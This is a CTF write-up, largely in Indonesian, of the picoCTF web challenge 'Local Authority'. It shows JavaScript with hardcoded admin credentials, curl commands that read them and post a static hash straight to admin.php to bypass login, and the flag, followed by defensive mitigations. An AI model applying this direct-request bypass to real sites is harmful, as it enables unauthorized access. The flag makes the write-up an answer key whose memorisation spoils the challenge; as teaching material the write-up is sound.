# Writeup: Local Authority (Challenge ID: 278)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Client-Side Authentication Bypass & Hardcoded Credentials (CWE-603 / CWE-798 / OWASP A07)
- **Difficulty:** Easy (diff=1)
- **Author:** LT 'syreal' Jones
- **Event:** picoCTF 2022
- **Points:** 100
- **Flag:** `academy{j5_15_7r4n5p4r3n7_28ad420c}`

---

## Problem Statement & Scope

Tantangan menyajikan sebuah portal web otentikasi pelanggan (*Secure Customer Portal*):
> *"Can you get the flag? Go to this website and see what you can find."*

Spesifikasi lingkungan:
- Format arsitektur: Web server Apache / PHP dengan rendering halaman login statis.
- Antarmuka meminta kredensial `username` dan `password` untuk mengakses konsol administratif.
- Analis diminta mengaudit mekanisme validasi otentikasi web, mengidentifikasi kelemahan tata kelola kredensial di sisi klien (*client-side authentication failure*), dan memulihkan token bendera resmi.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Client-Side Authentication Logic (CWE-603 / OWASP A07:2021):**
   Aplikasi memvalidasi keabsahan data otentikasi pengguna sepenuhnya di sisi peramban (*client-side browser*) menggunakan fungsi JavaScript internal:
   ```javascript
   function checkPassword(username, password) {
     if (username === 'admin' && password === 'strongPassword098765') {
       return true;
     } else {
       return false;
     }
   }
   ```
   Seluruh logika perbandingan karakter dieksekusi di peramban tanpa melibatkan otorisasi sesi server.
2. **Kredensial Tertanam dalam Kode Sumber (CWE-798 - Use of Hard-coded Credentials):**
   Kredensial pengguna administratif (`admin` : `strongPassword098765`) disimpan dalam bentuk teks jelas (*cleartext*) di dalam berkas skrip publik `secure.js`. Siapapun pengguna tidak terotentikasi dapat mengunduh dan membaca berkas ini secara langsung melalui permintaan HTTP GET tanpa batasan hak akses.
3. **Broken Object Authorization & Form Hash Bypassing (NIST SP 800-115 § 4.3):**
   Ketika validasi klien menghasilkan nilai `true`, skrip mengisi elemen formulir tersembunyi `adminFormHash` dengan nilai heksadesimal statis:
   ```javascript
   document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
   document.getElementById('hiddenAdminForm').submit();
   ```
   Server web pada `admin.php` menerima nilai hash ini tanpa memverifikasi cookie sesi pengguna aktif, status otentikasi HTTP, atau token anti-CSRF, sehingga memungkinkan permintaan langsung yang memotong keseluruhan gerbang login.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Reconnaissance Halaman Login:**
   Mengirimkan permintaan inspeksi terhadap rute formulir masuk `login.php`:
   ```bash
   curl -s -i "http://<target_host>:<port>/login.php"
   ```
   Respons HTML mengungkap adanya pemuatan skrip eksternal:
   `<script src="secure.js"></script>`.
2. **Ekstraksi Kredensial dan Logika Validasi:**
   Mengunduh berkas `secure.js` secara langsung:
   ```bash
   curl -s "http://<target_host>:<port>/secure.js"
   ```
   Ditemukan pasangan username `admin` dan password `strongPassword098765`.
3. **Analisis Transisi Sesi Tersembunyi:**
   Pada skrip klien, jika `checkPassword()` bernilai benar, form diarahkan ke `admin.php` membawa parameter data `hash=2196812e91c29df34f5e217cfd639881`.
4. **Permintaan Langsung Endpoint Administratif:**
   Mengirimkan permintaan HTTP POST langsung ke `admin.php`:
   ```bash
   curl -s -X POST -d "hash=2196812e91c29df34f5e217cfd639881" "http://<target_host>:<port>/admin.php"
   ```
   Respons HTML server menampilkan flag resmi: `academy{j5_15_7r4n5p4r3n7_28ad420c}`.

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{j5_15_7r4n5p4r3n7_28ad420c}`
- **Status Live Solver:** Terverifikasi live HTTP 201 (`correct: true`) pada platform CyLab Security Academy via `scripts/solve_278_local_authority.py`.
- **Kesesuaian Format:** Menggunakan wrapper resmi platform CyLab Academy `academy{...}`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)

1. **Prinsip Otentikasi Sisi Server (Server-Side Authentication Mandate):**
   Verifikasi kredensial dilarang keras dilakukan pada lapisan klien (JavaScript/HTML). Seluruh validasi harus dieksekusi secara aman di sisi server menggunakan fungsi komparasi konstan (*constant-time comparison*) terhadap hash kata sandi ber-salt kriptografis (misal: Argon2id atau bcrypt).
2. **Pengelolaan Sesi Terpusat (Secure Session Management):**
   Setelah proses login berhasil, server harus menerbitkan pengidentifikasi sesi unik berkekuatan acak tinggi (*cryptographically secure pseudorandom token*) yang disimpan dalam cookie dengan atribut keamanan ketat: `HttpOnly`, `Secure`, dan `SameSite=Strict`. Halaman sensitif seperti `admin.php` wajib memeriksa validitas sesi ini di awal eksekusi backend.
3. **Relevansi Modul LKS Cyber Security:**
   Tantangan ini menjadi dasar penting dalam bimbingan teknis LKS Cyber Security bidang Web Application Security: pemahaman inspeksi kode sumber, audit aset statis JavaScript, serta pengujian logika otentikasi dan otorisasi aplikasi web.
